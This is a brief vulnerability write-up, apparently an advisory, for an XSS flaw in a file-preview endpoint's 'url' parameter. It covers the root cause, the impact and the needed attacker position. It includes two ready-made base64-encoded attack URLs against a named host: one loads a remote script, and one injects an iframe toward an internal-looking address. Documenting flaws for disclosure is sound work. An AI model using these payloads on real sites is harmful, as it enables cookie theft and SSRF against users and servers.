- **Root cause of vulnerability**: The `url` parameter in the `/onlinePreview` endpoint of `OnlinePreviewController.java` is user-controlled and is directly output to the page without proper sanitization or encoding.
- **Weaknesses/vulnerabilities present**: Cross-Site Scripting (XSS) vulnerability.
- **Impact of exploitation**:
    - Website cookies leakage.
    - Potential for iframe-based Server-Side Request Forgery (SSRF).
- **Attack vectors**:
    - By crafting a malicious URL containing JavaScript or iframe tags in the `url` parameter and base64 encoding it before providing to the vulnerable endpoint
    - Example malicious URLs:
       - `<https://file.keking.cn/onlinePreview?url=aHR0cDovLyI+PHNjcmlwdC9zcmM9aHR0cHM6Ly94c3Mucm9ja3MveHNzLmpzPi90ZXN0LnBuZw==>` (XSS payload using script tag)
       - `<https://file.keking.cn/onlinePreview?url=aHR0cDovLyI+PGlmcmFtZS9zcmM9aHR0cHM6Ly91YXQtazhzLmtla2luZy5jbi8gaGVpZ2h0PTEwMDAgd2lkdGg9MTAwMD4vdGVzdC5wbmc=>` (iframe SSRF)
- **Required attacker capabilities/position**: An attacker needs to be able to craft and send a URL to the vulnerable endpoint with the malicious `url` parameter.